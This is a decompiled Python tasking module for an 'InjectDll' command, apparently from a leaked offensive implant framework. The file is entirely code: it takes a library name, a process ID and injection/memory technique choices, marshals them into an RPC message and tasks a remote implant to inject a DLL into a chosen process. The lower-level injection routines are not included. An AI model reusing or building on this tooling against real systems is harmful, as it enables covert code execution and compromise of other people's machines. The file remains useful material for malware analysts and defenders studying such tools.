# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.0b2 (default, Oct 11 2016, 05:27:10) 
# [GCC 6.2.0 20161005]
# Embedded file name: Mcl_Cmd_InjectDll_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'pc.cmd.injectdll', globals())
    mcl.imports.ImportWithNamespace(namespace, 'pc.cmd.injectdll.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['library'] == None or len(lpParams['library']) == 0:
        mcl.tasking.OutputError('Invalid library name')
        return False
    else:
        tgtParams = pc.cmd.injectdll.Params()
        tgtParams.threadProvider = mcl.tasking.technique.Lookup('INJECTDLL', mcl.tasking.technique.TECHNIQUE_MCL_INJECT, lpParams['thread'])
        tgtParams.memoryProvider = mcl.tasking.technique.Lookup('INJECTDLL', mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, lpParams['memory'])
        tgtParams.procId = lpParams['procId']
        tgtParams.library = lpParams['library']
        rpc = pc.cmd.injectdll.tasking.RPC_INFO_INJECT
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        taskXml = mcl.tasking.Tasking()
        taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, tgtParams.memoryProvider)
        taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_INJECT, tgtParams.threadProvider)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, pc.cmd.injectdll.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)